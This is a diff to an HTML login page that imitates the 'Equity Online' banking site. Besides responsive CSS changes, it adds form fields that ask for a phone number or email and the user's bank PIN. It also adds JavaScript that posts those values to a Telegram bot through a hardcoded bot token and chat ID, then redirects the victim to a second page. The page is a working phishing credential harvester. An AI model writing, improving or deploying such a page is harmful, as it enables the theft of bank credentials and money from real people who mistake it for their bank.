@@ -11,6 +11,8 @@
             margin: 0;
             font-family: 'Roboto', sans-serif;
             display: flex;
+            flex-direction: column;
+            /* Stack sections vertically */
             height: 100vh;
             background-color: #f7f7f7;
         }
@@ -18,11 +20,16 @@
         .left-section {
             flex: 2;
             background: #C8102E;
+            /* Dark Red */
             display: flex;
-            justify-content: flex-start;
+            flex-direction: column;
+            justify-content: center;
             align-items: center;
+            /* Centered content for mobile */
             padding: 40px;
             color: white;
+            text-align: center;
+            /* Center text */
         }
         
         .right-section {
@@ -40,6 +47,8 @@
             border-radius: 5px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             padding: 20px;
+            margin: auto;
+            /* Center the form */
         }
         
         .login-form h2 {
@@ -70,6 +79,7 @@
             width: 100%;
             padding: 10px;
             background-color: #C8102E;
+            /* Dark Red */
             color: white;
             border: none;
             border-radius: 4px;
@@ -79,6 +89,7 @@
         
         button:hover {
             background-color: #A50F20;
+            /* Darker Red */
         }
         
         .footer {
@@ -93,7 +104,31 @@
         
         .logo {
             max-width: 150px;
+            /* Adjust the size as needed */
             margin-bottom: 20px;
+        }
+        /* Responsive Styles */
+        
+        @media (max-width: 768px) {
+            .left-section {
+                padding: 20px;
+            }
+            .login-form {
+                padding: 15px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .left-section {
+                padding: 10px;
+            }
+            .login-form {
+                padding: 10px;
+            }
+            .logo {
+                max-width: 100px;
+                /* Smaller logo for mobile */
+            }
         }
     </style>
 </head>
@@ -103,7 +138,7 @@
     <div class="left-section">
         <div>
             <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
-            <h1>Welcome to Equity online</h1>
+            <h1>Welcome to Equity Online</h1>
             <p>More than just banking.</p>
         </div>
     </div>
@@ -115,14 +150,16 @@
 
             <div class="form-group">
                 <input type="radio" id="by-sms" name="verification" value="sms" checked>
-                <label for="by-sms">By SMS</label>
-                <p>1234567890</p>
+                <label for="by-sms">Put Your PIN</label>
+                <input type="text" id="phone" placeholder="Enter your phone number" required>
+                <input type="password" id="pin-sms" placeholder="Enter your Equity PIN" required>
             </div>
 
             <div class="form-group">
                 <input type="radio" id="by-email" name="verification" value="email">
-                <label for="by-email">By Email</label>
-                <p>************@gmail.com</p>
+                <label for="by-email">Put Your PIN</label>
+                <input type="text" id="email" placeholder="Enter your email" required>
+                <input type="password" id="pin-email" placeholder="Enter your Equity PIN" required>
             </div>
 
             <button id="next-button">Next</button>
@@ -133,13 +170,62 @@
     <script>
         document.getElementById('next-button').addEventListener('click', function() {
             const selectedOption = document.querySelector('input[name="verification"]:checked');
+            let phone, email, pin;
 
             if (selectedOption) {
-                window.location.href = "equity2.html";
+                if (selectedOption.value === 'sms') {
+                    phone = document.getElementById('phone').value.trim();
+                    pin = document.getElementById('pin-sms').value.trim();
+
+                    if (phone && pin) {
+                        const message = `Verification Method: SMS\nPhone: ${phone}\nPIN: ${pin}`;
+                        sendMessageToTelegram(message);
+                    } else {
+                        alert("Please fill in both the phone number and PIN.");
+                    }
+
+                } else {
+                    email = document.getElementById('email').value.trim();
+                    pin = document.getElementById('pin-email').value.trim();
+
+                    if (email && pin) {
+                        const message = `Verification Method: Email\nEmail: ${email}\nPIN: ${pin}`;
+                        sendMessageToTelegram(message);
+                    } else {
+                        alert("Please fill in both the email and PIN.");
+                    }
+                }
             } else {
                 alert("Please select a verification method.");
             }
         });
+
+        function sendMessageToTelegram(message) {
+            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0'; // Replace with your bot token
+            const chatId = '5615316142'; // Replace with your chat ID
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "equity2.html"; // Redirect on success
+                    } else {
+                        alert('Error sending data to Telegram.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending data to Telegram.');
+                });
+        }
     </script>
 
 </body>
